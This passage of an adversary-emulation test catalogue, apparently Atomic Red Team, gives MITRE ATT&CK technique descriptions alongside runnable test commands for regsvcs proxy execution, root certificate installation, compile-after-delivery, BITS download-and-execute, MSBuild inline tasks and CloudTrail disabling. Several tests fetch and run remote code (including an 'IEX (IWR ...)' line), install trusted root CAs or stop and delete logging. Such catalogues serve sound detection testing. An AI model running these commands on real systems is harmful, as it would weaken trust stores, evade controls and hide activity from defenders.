\"#{source_file}\"\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n", "cleanup_command": "del #{output_file} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Regsvcs Uninstall Method Call Test", "auto_generated_guid": "fd3c1c6a-02d2-4b72-82d9-71c527abb126", "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Location of the payload", "type": "path", "default": "$Env:TEMP\\T1218.009.dll"}, "source_file": {"description": "Location of the CSharp source_file", "type": "path", "default": "PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The CSharp source file must exist on disk at specified location (#{source_file})\n", "prereq_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs\" -OutFile \"#{source_file}\"\n"}], "executor": {"command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n", "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore | Out-Null\n$parentpath = Split-Path -Path \"#{output_file}\"\nRemove-Item $parentpath\\key.snk -ErrorAction Ignore | Out-Null\nRemove-Item $parentpath\\T1218.009.tlb -ErrorAction Ignore | Out-Null\n", "name": "powershell", "elevation_required": true}}]}, "T1553.004": {"name": "Install Root Certificate", "technique_id": "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839", "external_id": "T1553.004", "data_components": ["Process Creation", "Command Execution", "Windows Registry Key Creation", "Windows Registry Key Modification"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067"], "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)", "atomic_tests": [{"name": "Install root CA on CentOS/RHEL", "auto_generated_guid": "9c096ec4-fd42-419d-a762-d64cc950627e", "description": "Creates a root CA with openssl\n", "supported_platforms": ["linux"], "input_arguments": {"cert_filename": {"description": "Path of the CA certificate we create", "type": "path", "default": "rootCA.crt"}, "key_filename": {"description": "Key we create that is used to create the CA certificate", "type": "path", "default": "rootCA.key"}}, "executor": {"command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /etc/pki/ca-trust/source/anchors/\nupdate-ca-trust\n", "cleanup_command": "rm /etc/pki/ca-trust/source/anchors/#{cert_filename}\nupdate-ca-trust\n", "name": "sh", "elevation_required": true}}, {"name": "Install root CA on FreeBSD", "auto_generated_guid": "f4568003-1438-44ab-a234-b3252ea7e7a3", "description": "Creates a root CA with openssl\n", "supported_platforms": ["linux"], "input_arguments": {"cert_filename": {"description": "Path of the CA certificate we create", "type": "path", "default": "rootCA.crt"}, "key_filename": {"description": "Key we create that is used to create the CA certificate", "type": "path", "default": "rootCA.key"}}, "executor": {"command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /usr/local/share/certs/\ncertctl rehash\n", "cleanup_command": "rm /usr/local/share/certs/#{cert_filename}\ncertctl rehash\n", "name": "sh", "elevation_required": true}}, {"name": "Install root CA on Debian/Ubuntu", "auto_generated_guid": "53bcf8a0-1549-4b85-b919-010c56d724ff", "description": "Creates a root CA with openssl\n", "supported_platforms": ["linux"], "input_arguments": {"cert_filename": {"description": "CA file name", "type": "path", "default": "rootCA.crt"}, "key_filename": {"description": "Key we create that is used to create the CA certificate", "type": "path", "default": "rootCA.key"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Verify the certificate exists. It generates if not on disk.\n", "prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"}], "executor": {"command": "mv #{cert_filename} /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n", "name": "sh", "elevation_required": true}}, {"name": "Install root CA on macOS", "auto_generated_guid": "cc4a0b8c-426f-40ff-9426-4e10e5bf4c49", "description": "Creates a root CA with openssl\n", "supported_platforms": ["macos"], "input_arguments": {"cert_filename": {"description": "CA file name", "type": "path", "default": "rootCA.crt"}, "key_filename": {"description": "Key we create that is used to create the CA certificate", "type": "path", "default": "rootCA.key"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Verify the certificate exists. It generates if not on disk.\n", "prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"}], "executor": {"command": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n", "name": "sh", "elevation_required": true}}, {"name": "Install root CA on Windows", "auto_generated_guid": "76f49d86-5eb1-461a-a032-a480f86652f1", "description": "Creates a root CA with Powershell\n", "supported_platforms": ["windows"], "input_arguments": {"pfx_path": {"description": "Path of the certificate", "type": "path", "default": "rootCA.cer"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Verify the certificate exists. It generates if not on disk.\n", "prereq_command": "if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n"}], "executor": {"command": "$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n", "cleanup_command": "try {\n   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n", "name": "powershell", "elevation_required": true}}, {"name": "Install root CA on Windows with certutil", "auto_generated_guid": "5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f", "description": "Creates a root CA with certutil\n", "supported_platforms": ["windows"], "input_arguments": {"pfx_path": {"description": "Path of the certificate", "type": "path", "default": "$env:Temp\\rootCA2.cer"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Certificate must exist at specified location (#{pfx_path})\n", "prereq_command": "if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n"}], "executor": {"command": "certutil -addstore my #{pfx_path}\n", "cleanup_command": "try {\n$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n", "name": "powershell", "elevation_required": true}}, {"name": "Add Root Certificate to CurrentUser Certificate Store", "auto_generated_guid": "ca20a3f1-42b5-4e21-ad3f-1049199ec2e0", "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n", "supported_platforms": ["windows"], "executor": {"command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n", "cleanup_command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n", "name": "powershell", "elevation_required": true}}]}, "T1027.004": {"name": "Compile After Delivery", "technique_id": "attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617", "external_id": "T1027.004", "data_components": ["File Metadata", "Process Creation", "Command Execution", "File Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)", "atomic_tests": [{"name": "Compile After Delivery using csc.exe", "auto_generated_guid": "ffcdbd6a-b0e8-487d-927a-09127fe9a206", "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Output compiled binary", "type": "path", "default": "C:\\Windows\\Temp\\T1027.004.exe"}, "input_file": {"description": "C# code that launches calc.exe from a hidden cmd.exe Window", "type": "path", "default": "PathToAtomicsFolder\\T1027.004\\src\\calc.cs"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "C# file must exist on disk at specified location (#{input_file})\n", "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs\" -OutFile \"#{input_file}\"\n"}], "executor": {"command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} \"#{input_file}\"\n", "cleanup_command": "del #{output_file} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Dynamic C# Compile", "auto_generated_guid": "453614d8-3ba6-4147-acc0-7ec4b3e1faef", "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is contained in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "exe program containing dynamically compiled C# code", "type": "path", "default": "PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "exe file must exist on disk at specified location (#{input_file})\n", "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe -OutFile \"#{input_file}\"\n"}], "executor": {"command": "Invoke-Expression \"#{input_file}\"\n", "name": "powershell"}}, {"name": "C compile", "auto_generated_guid": "d0377aa6-850a-42b2-95f0-de558d80be57", "description": "Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_file": {"description": "source file", "type": "path", "default": "PathToAtomicsFolder/T1027.004/src/T1027-004-test.c"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "the source file must exist on disk at specified location (#{input_file})\n", "prereq_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O \"#{input_file}\"\n"}], "executor": {"command": "gcc #{input_file} && ./a.out\nclang #{input_file} && ./a.out\n", "name": "sh"}}, {"name": "CC compile", "auto_generated_guid": "da97bb11-d6d0-4fc1-b445-e443d1346efe", "description": "Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_file": {"description": "source file", "type": "path", "default": "PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "the source file must exist on disk at specified location (#{input_file})\n", "prereq_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O #{input_file}\n"}], "executor": {"command": "g++ #{input_file} && ./a.out\nclang++ #{input_file} && ./a.out\n", "name": "sh"}}, {"name": "Go compile", "auto_generated_guid": "78bd3fa7-773c-449e-a978-dc1f1500bc52", "description": "Compile a go file with golang on FreeBSD, Linux or Macos.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_file": {"description": "source file", "type": "path", "default": "PathToAtomicsFolder/T1027.004/src/T1027-004-test.go"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "the source file must exist on disk at specified location (#{input_file})\n", "prereq_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O #{input_file}\n"}], "executor": {"command": "go run #{input_file}\n", "name": "sh"}}]}, "T1197": {"name": "BITS Jobs", "technique_id": "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7", "external_id": "T1197", "data_components": ["Command Execution", "Service Metadata", "Process Creation", "Network Connection Creation"], "kill_chain_phases": ["defense-evasion", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)", "atomic_tests": [{"name": "Bitsadmin Download (cmd)", "auto_generated_guid": "3c73d728-75fb-4180-a12f-6712864d7421", "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "Remote file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, "local_file": {"description": "Local file path to save downloaded file", "type": "path", "default": "%temp%\\bitsadmin1_flag.ps1"}}, "executor": {"command": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n", "cleanup_command": "del #{local_file} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Bitsadmin Download (PowerShell)", "auto_generated_guid": "f63b8bc4-07e5-4112-acba-56f646f3f0bc", "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "Remote file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, "local_file": {"description": "Local file path to save downloaded file", "type": "path", "default": "$env:TEMP\\bitsadmin2_flag.ps1"}}, "executor": {"command": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\n", "cleanup_command": "Remove-Item #{local_file} -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Persist, Download, & Execute", "auto_generated_guid": "62a06ec5-5754-47d2-bcfc-123d8314c6ae", "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n", "supported_platforms": ["windows"], "input_arguments": {"command_path": {"description": "Path of command to execute", "type": "path", "default": "C:\\Windows\\system32\\notepad.exe"}, "bits_job_name": {"description": "Name of BITS job", "type": "string", "default": "AtomicBITS"}, "local_file": {"description": "Local file path to save downloaded file", "type": "path", "default": "%temp%\\bitsadmin3_flag.ps1"}, "remote_file": {"description": "Remote file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}}, "executor": {"command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\nbitsadmin.exe /resume #{bits_job_name}\nping -n 5 127.0.0.1 >nul 2>&1\nbitsadmin.exe /complete #{bits_job_name}\n", "cleanup_command": "del #{local_file} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Bits download using desktopimgdownldr.exe (cmd)", "auto_generated_guid": "afb5e09e-e385-4dee-9a94-6ee60979d114", "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (\u201c-k netsvc -p -s BITS\u201d) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "Remote file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"}, "download_path": {"description": "Local file path to save downloaded file", "type": "path", "default": "SYSTEMROOT=C:\\Windows\\Temp"}, "cleanup_path": {"description": "path to delete file as part of cleanup_command", "type": "path", "default": "C:\\Windows\\Temp\\Personalization\\LockScreenImage"}, "cleanup_file": {"description": "file to remove as part of cleanup_command", "type": "string", "default": "*.md"}}, "executor": {"command": "set \"#{download_path}\" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n", "cleanup_command": "del #{cleanup_path}\\#{cleanup_file} >nul 2>&1\n", "name": "command_prompt"}}]}, "T1127.001": {"name": "MSBuild", "technique_id": "attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96", "external_id": "T1127.001", "data_components": ["Process Creation", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)", "atomic_tests": [{"name": "MSBuild Bypass Using Inline Tasks (C#)", "auto_generated_guid": "58742c0f-cb01-44cd-a60b-fb26e8871c93", "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n", "supported_platforms": ["windows"], "input_arguments": {"filename": {"description": "Location of the project file", "type": "path", "default": "PathToAtomicsFolder\\T1127.001\\src\\T1127.001.csproj"}, "msbuildpath": {"description": "Default location of MSBuild", "type": "path", "default": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"}, "msbuildname": {"description": "Default name of MSBuild", "type": "path", "default": "msbuild.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Project file must exist on disk at specified location (#{filename})\n", "prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj\" -OutFile \"#{filename}\"\n"}], "executor": {"command": "#{msbuildpath}\\#{msbuildname} \"#{filename}\"\n", "name": "command_prompt"}}, {"name": "MSBuild Bypass Using Inline Tasks (VB)", "auto_generated_guid": "ab042179-c0c5-402f-9bc8-42741f5ce359", "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n", "supported_platforms": ["windows"], "input_arguments": {"filename": {"description": "Location of the project file", "type": "path", "default": "PathToAtomicsFolder\\T1127.001\\src\\vb.xml"}, "msbuildpath": {"description": "Default location of MSBuild", "type": "path", "default": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"}, "msbuildname": {"description": "Default name of MSBuild", "type": "path", "default": "msbuild.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Project file must exist on disk at specified location (#{filename})\n", "prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml\" -OutFile \"#{filename}\"\n"}], "executor": {"command": "#{msbuildpath}\\#{msbuildname} \"#{filename}\"\n", "name": "command_prompt"}}]}, "T1562.008": {"name": "Disable Cloud Logs", "technique_id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d", "external_id": "T1562.008", "data_components": ["Cloud Service Modification", "User Account Modification", "Cloud Service Disable"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)", "atomic_tests": [{"name": "AWS - CloudTrail Changes", "auto_generated_guid": "9c10dc6b-20bd-403a-8e67-50ef7d07ed4e", "description": "Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail\n", "supported_platforms": ["iaas:aws"], "input_arguments": {"cloudtrail_name": {"description": "Name of the cloudTrail", "type": "string", "default": "redatomictesttrail"}, "s3_bucket_name": {"description": "Name of the bucket", "type": "string", "default": "redatomic-test"}, "region": {"description": "Name of the region", "type": "string", "default": "us-east-1"}}, "dependencies": [{"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"}, {"description": "Check if terraform is installed.\n", "prereq_command": "terraform version\n", "get_prereq_command": "echo Please install the terraform and configure your aws default profile \n"}, {"description": "Check if the dependency resources are already present.\n", "prereq_command": "if [ -f \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/terraform.tfstate\" ]; then exit 0; else 